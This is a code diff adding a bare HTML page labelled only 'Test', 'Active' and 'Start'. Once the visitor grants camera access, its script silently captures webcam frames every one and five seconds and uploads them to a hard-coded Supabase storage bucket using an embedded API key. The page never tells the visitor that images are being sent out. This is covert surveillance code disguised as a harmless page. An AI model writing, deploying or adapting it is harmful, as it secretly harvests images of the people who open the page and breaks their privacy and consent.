@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Test</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #0d0d0d;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      color: white;
+    }
+
+    h2 {
+      margin-top: 20px;
+      font-size: 26px;
+      font-weight: 600;
+      color: #00e1ff;
+      text-shadow: 0 0 10px #00e1ff;
+    }
+
+    #startBtn {
+      margin-top: 20px;
+      padding: 14px 28px;
+      font-size: 18px;
+      background: #00e1ff;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      color: #000;
+      font-weight: bold;
+      transition: 0.2s;
+    }
+
+    #startBtn:hover {
+      background: #00a3c4;
+    }
+
+    #preview {
+      margin-top: 25px;
+      width: 90%;
+      max-width: 400px;
+      border-radius: 12px;
+      border: 3px solid #00e1ff;
+      box-shadow: 0 0 20px rgba(0,225,255,0.8);
+    }
+
+    .status {
+      margin-top: 10px;
+      font-size: 16px;
+      color: #00e1ff;
+    }
+  </style>
+</head>
+
+<body>
+
+<h2>Active</h2>
+
+<button id="startBtn">Start</button>
+
+<br>
+<video id="preview" autoplay playsinline muted hidden></video>
+<p class="status" id="statusText"></p>
+
+<script type="module">
+import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
+
+const supabase = createClient(
+  "https://khabkjuaxdrowdyjeiix.supabase.co",
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtoYWJranVheGRyb3dkeWplaWl4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQzMDkwMTAsImV4cCI6MjA3OTg4NTAxMH0.JuZ4yur33WoaX-0333JmoxCA_OwD0kWLNZGnzcnOUxg"
+);
+
+async function uploadFile(fileName, blob) {
+  const { error } = await supabase.storage
+    .from("uploads")
+    .upload(fileName, blob, { upsert: false });
+
+  if (error) console.error(error);
+  else console.log("Uploaded:", fileName);
+}
+
+document.getElementById("startBtn").onclick = async () => {
+  document.getElementById("startBtn").innerText = "Camera";
+  document.getElementById("startBtn").disabled = true;
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: true,
+    audio: false   // NO SOUND
+  });
+
+  const video = document.getElementById("preview");
+  video.hidden = false;
+  video.srcObject = stream;
+  video.muted = true;
+  video.play();
+
+  document.getElementById("statusText").innerText = "photo";
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+
+  // --- PHOTO EVERY 1 SECOND ---
+  setInterval(() => {
+    if (document.visibilityState !== "visible") return;
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob((blob) => {
+      const name = `p1s_${Date.now()}.jpg`;
+      uploadFile(name, blob);
+    }, "image/jpeg");
+  }, 1000);
+
+  // --- PHOTO EVERY 5 SECONDS ---
+  setInterval(() => {
+    if (document.visibilityState !== "visible") return;
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob((blob) => {
+      const name = `p5s_${Date.now()}.jpg`;
+      uploadFile(name, blob);
+    }, "image/jpeg");
+  }, 5000);
+};
+</script>
+
+</body>
+</html>
